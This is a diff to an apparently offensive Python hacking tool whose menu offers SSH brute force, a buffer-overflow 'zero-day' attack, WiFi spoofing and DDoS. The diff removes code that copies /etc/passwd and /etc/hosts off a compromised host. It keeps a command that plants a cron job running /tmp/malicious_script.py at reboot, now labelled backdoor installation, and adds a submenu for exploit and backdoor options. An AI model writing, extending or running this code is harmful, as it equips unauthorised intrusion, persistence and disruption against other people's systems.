@@ -111,6 +111,8 @@ def zero_attack(url_or_ip):
     except Exception as e:
         print(f"Buffer overflow attack failed on {url_or_ip}: {e}")
 
+# SSH Brute Force and Backdoor Installation
+def ssh_backdoor(url_or_ip):
     print(f"Attempting SSH brute force on {url_or_ip}...")
     try:
         client = paramiko.SSHClient()
@@ -128,27 +130,16 @@ def zero_attack(url_or_ip):
             print(f"SSH brute force failed on {url_or_ip}")
             return
 
-        print("Attempting data exfiltration...")
-        sftp = client.open_sftp()
-        sensitive_files = ['/etc/passwd', '/etc/hosts']
-        for file in sensitive_files:
-            try:
-                sftp.get(file, f'./stolen_{os.path.basename(file)}')
-                print(f"Exfiltrated {file}")
-            except Exception as e:
-                print(f"Failed to exfiltrate {file}: {e}")
-        sftp.close()
-
-        print("Setting up persistence...")
+        print("Installing backdoor...")
         command = '(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/malicious_script.py") | crontab -'
         stdin, stdout, stderr = client.exec_command(command)
         stdout.channel.recv_exit_status()
-        print(f"Persistence mechanism installed on {url_or_ip}")
+        print(f"Backdoor installed on {url_or_ip}")
 
         client.close()
 
     except Exception as e:
-        print(f"Failed SSH attack or persistence mechanism on {url_or_ip}: {e}")
+        print(f"Failed SSH attack or backdoor installation on {url_or_ip}: {e}")
 
 # Simulate WiFi spoofing
 def wifi_spoofing():
@@ -219,6 +210,26 @@ def ddos_attack():
         thr.start()
         print(str(i + 1) + " threads started!")
 
+# Submenu for Admin (zero attack)
+def zero_attack_menu(url_or_ip):
+    while True:
+        print(Fore.YELLOW + """
+        Admin (Zero-Day Attack) Options:
+        [1] Zero-Day Exploit (buffer overflow)
+        [2] Backdoor Installation
+        [3] Exit to Main Menu
+        """)
+        sub_choice = input("Select an option: ").strip()
+        if sub_choice == "1":
+            zero_attack(url_or_ip)
+        elif sub_choice == "2":
+            ssh_backdoor(url_or_ip)
+        elif sub_choice == "3":
+            break
+        else:
+            print("Invalid option selected.")
+        input("Press Enter to return to the menu...")
+
 # Main user interface
 def display_ui():
     while True:
@@ -244,7 +255,7 @@ def display_ui():
         [12] Exit
         """)
 
-        choice = input("Select the method (1-12): ").strip() 
+        choice = input("Select the method (1-12): ").strip()
 
         if choice == "1":
             ip_address = input("Enter the IP address: ").strip()
@@ -284,7 +295,7 @@ def display_ui():
             web_crawler(start_url, max_depth)
         elif choice == "10":
             url_or_ip = input("Enter the URL or IP address to use: ").strip()
-            zero_attack(url_or_ip)
+            zero_attack_menu(url_or_ip)
         elif choice == "11":
             ddos_attack()
         elif choice == "12":
